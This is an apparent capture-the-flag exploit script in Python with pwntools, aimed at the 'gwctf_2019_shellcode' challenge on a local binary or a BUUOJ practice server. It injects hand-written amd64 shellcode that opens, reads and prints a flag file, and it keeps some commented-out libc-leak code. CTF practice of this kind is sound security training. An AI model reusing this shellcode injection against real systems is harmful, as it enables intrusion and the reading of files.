#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./gwctf_2019_shellcode'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',26289)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		shell='''
		push 0
		mov  rax,0x67616c662f2e
		push rax
		mov  rdi,rsp
		xor  rsi,rsi
		xor  rdx,rdx
		xor  rax,rax
		mov  al,0x2
		syscall

		mov  rdi,rax
		mov  rsi,rsp
		xor  rdx,rdx
		mov  dl,0x30
		xor  rax,rax
		syscall

		xor  rdi,rdi
		inc  rdi
		mov  rsi,rsp
		xor  rdx,rdx
		mov  dl,0x30
		xor  rax,rax
		mov  al,0x1
		syscall
		'''
		# gdb.attach(io)
		# io.sendline(pay)
		# sleep(1)
		io.sendline(asm(shell))
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		
		# success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue